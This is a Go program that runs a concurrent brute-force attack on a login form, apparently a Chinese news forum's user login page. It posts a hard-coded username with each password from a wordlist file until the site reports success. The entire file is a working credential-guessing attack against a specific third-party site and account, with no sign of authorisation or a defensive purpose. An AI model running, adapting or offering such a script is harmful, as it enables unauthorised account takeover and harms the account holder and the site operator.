package main

import (
	"bufio"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"strings"
	"syscall"
	"time"
)

const baseurl = "http://club.qingdaonews.com/user/login.php"

type databody struct {
	result string `json:"result"`
}

var chanline chan string

func handler(line string) {
	chanline <- line
}

func getPostData() {
	for {
		line := <-chanline

		resp, err := http.PostForm(baseurl,
			url.Values{"username": {"woaihuangdao123"}, "password": {line}})
		if err != nil {
			log.Fatal(err)
			// continue
		}

		body, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			log.Fatal(err)
		}
		resp.Body.Close()

		v := make(map[string]string)
		err = json.Unmarshal(body, &v)
		if err != nil {
			// log.Fatal(err)
			fmt.Printf("json error :%s\n", err.Error())
		}

		if v["result"] == "success" {
			fmt.Printf("%s ok\n", line)
			panic("FINISH")
		}

		fmt.Printf("%s wrong\n", line)
	}

}

func main() {
	file, err := os.Open("pass.txt") // For read access.
	if err != nil {
		log.Fatal(err)
	}

	chanline = make(chan string, 1000)

	buf := bufio.NewReader(file)

	for i := 0; i < 10; i++ {
		go getPostData()
	}

	for {
		line, err := buf.ReadString('\n')
		line = strings.TrimSpace(line)
		handler(line)
		if err != nil {
			if err == io.EOF {
				break
			}
			fmt.Printf("Error :%s", err.Error())
		}
	}

	for {
		if len(chanline) == 0 {
			// panic("FINISH")
			fmt.Println("FINISH")
		}

		time.Sleep(time.Second * 5)
	}

	sigChan := make(chan os.Signal)
	signal.Notify(sigChan, os.Interrupt)
	signal.Notify(sigChan, syscall.SIGTERM)
	<-sigChan

	// data := make([]byte, 1000000)
	// count, err := file.Read(data)
	// if err != nil {
	// 	log.Fatal(err)
	// }

	// fmt.Printf("have read bytes number :%d", count)
	// fmt.Print("%s", string(data))

}
